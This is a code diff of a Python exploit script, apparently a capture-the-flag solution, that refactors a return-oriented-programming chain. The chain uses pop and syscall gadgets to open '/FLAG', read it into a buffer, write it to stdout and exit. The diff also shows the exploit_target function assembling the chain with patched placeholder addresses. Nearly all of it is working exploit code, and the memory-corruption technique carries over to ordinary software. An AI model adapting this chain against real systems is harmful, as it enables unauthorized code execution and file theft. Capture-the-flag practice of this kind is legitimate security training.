@@ -69,57 +69,48 @@ GADGET_POP_RDX = 0x15F6E   # pop rdx; ret
 GADGET_POP_RAX = 0x66287   # pop rax; ret
 GADGET_SYSCALL= 0x30BA6    # syscall; ret
 
-# Build each syscall segment: open, read, write, exit
-OPEN_SEQUENCE = [
-    GADGET_POP_RDI,    # rdi = pointer to "/FLAG"
-    PLACEHOLDER,       # placeholder for &"/FLAG"
-    GADGET_POP_RSI,    # rsi = O_RDONLY (0)
-    b'\x00',           # zero -> O_RDONLY
-    GADGET_POP_RAX,    # rax = SYS_open (2)
-    b'\x02',
-    GADGET_SYSCALL,    # perform open
-]
+SHELLCODE_ASM = [
+    # --- open("/FLAG", O_RDONLY) ---
+    GADGET_POP_RDI,    # pop rdi; ret -> rdi = pointer to "/FLAG"
+    PLACEHOLDER,       # Placeholder for flag_path_addr (will be patched later)
+    GADGET_POP_RSI,    # pop rsi; ret -> rsi = 0 (O_RDONLY)
+    b'\x00',           # 0x00 → O_RDONLY
+    GADGET_POP_RAX,    # pop rax; ret -> rax = SYS_open (2)
+    b'\x02',           # 0x02 (open syscall)
+    GADGET_SYSCALL,    # syscall; ret
 
-READ_SEQUENCE = [
-    GADGET_POP_RDI,    # rdi = file descriptor (assume 3)
-    b'\x03',
-    GADGET_POP_RSI,    # rsi = buffer address for reading flag
-    PLACEHOLDER,
-    GADGET_POP_RDX,    # rdx = number of bytes to read (64)
+    # --- read(fd=3, buf, 64) ---
+    GADGET_POP_RDI,    # pop rdi; ret -> rdi = file descriptor (assuming 3)
+    b'\x03',           # 0x03
+    GADGET_POP_RSI,    # pop rsi; ret -> rsi = buffer address
+    PLACEHOLDER,       # Placeholder for flag_buffer_addr (will be patched later)
+    GADGET_POP_RDX,    # pop rdx; ret -> rdx = 64
     to_word_bytes(FLAG_BUFFER_SIZE),
-    GADGET_POP_RAX,    # rax = SYS_read (0)
-    b'\x00',
-    GADGET_SYSCALL,    # perform read
-]
+    GADGET_POP_RAX,    # pop rax; ret -> rax = SYS_read (0)
+    b'\x00',           # 0x00 (read syscall)
+    GADGET_SYSCALL,    # syscall; ret
 
-WRITE_SEQUENCE = [
-    GADGET_POP_RDI,    # rdi = STDOUT (1)
-    b'\x01',
-    GADGET_POP_RSI,    # rsi = buffer address holding flag
-    PLACEHOLDER,
-    GADGET_POP_RDX,    # rdx = number of bytes to write (64)
+    # --- write(fd=1, buf, 64) ---
+    GADGET_POP_RDI,    # pop rdi; ret -> rdi = STDOUT (1)
+    b'\x01',           # 0x01
+    GADGET_POP_RSI,    # pop rsi; ret -> rsi = buffer address
+    PLACEHOLDER,       # Placeholder for flag_buffer_addr (will be patched later)
+    GADGET_POP_RDX,    # pop rdx; ret -> rdx = 64
     to_word_bytes(FLAG_BUFFER_SIZE),
-    GADGET_POP_RAX,    # rax = SYS_write (1)
-    b'\x01',
-    GADGET_SYSCALL,    # perform write
-]
+    GADGET_POP_RAX,    # pop rax; ret -> rax = SYS_write (1)
+    b'\x01',           # 0x01 (write syscall)
+    GADGET_SYSCALL,    # syscall; ret
 
-EXIT_SEQUENCE = [
-    GADGET_POP_RDI,    # rdi = exit status (0)
-    b'\x00',
-    GADGET_POP_RAX,    # rax = SYS_exit (60)
-    b'\x3C',
-    GADGET_SYSCALL,    # perform exit
-]
+    # --- exit(0) ---
+    GADGET_POP_RDI,    # pop rdi; ret -> rdi = 0
+    b'\x00',           # 0x00
+    GADGET_POP_RAX,    # pop rax; ret -> rax = SYS_exit (60)
+    b'\x3C',           # 0x3C (exit syscall)
+    GADGET_SYSCALL,    # syscall; ret
 
-# Combine all sequences, appending the raw "/FLAG" and zeroed-out flag buffer
-FULL_SHELL_PAYLOAD = [
-    *OPEN_SEQUENCE,
-    *READ_SEQUENCE,
-    *WRITE_SEQUENCE,
-    *EXIT_SEQUENCE,
-    to_word_bytes(FLAG_PATH_RAW),                    # "/FLAG\x00\x00\x00"
-    to_word_bytes(b'\x00' * FLAG_BUFFER_SIZE),       # 64 bytes of zero
+    # --- Data section: "/FLAG\0\0\0" + 64 bytes zeros ---
+    to_word_bytes(FLAG_PATH_RAW),          # "/FLAG\x00\x00\x00"
+    to_word_bytes(b'\x00' * FLAG_BUFFER_SIZE), # 64 bytes zero buffer
 ]
 
 def exploit_target(conn: remote):
@@ -158,7 +149,7 @@ def exploit_target(conn: remote):
     print(f"[+] ROP chain start address = 0x{rop_chain_start:016x}")
 
     # Assemble the raw ROP bytes (with placeholders still intact)
-    raw_chain = assemble_rop_chain(text_base, FULL_SHELL_PAYLOAD)
+    raw_chain = assemble_rop_chain(text_base, SHELLCODE_ASM)
 
     # Compute where the embedded "/FLAG" string and flag buffer will live
     new_rbp_value = rop_chain_start + len(raw_chain)
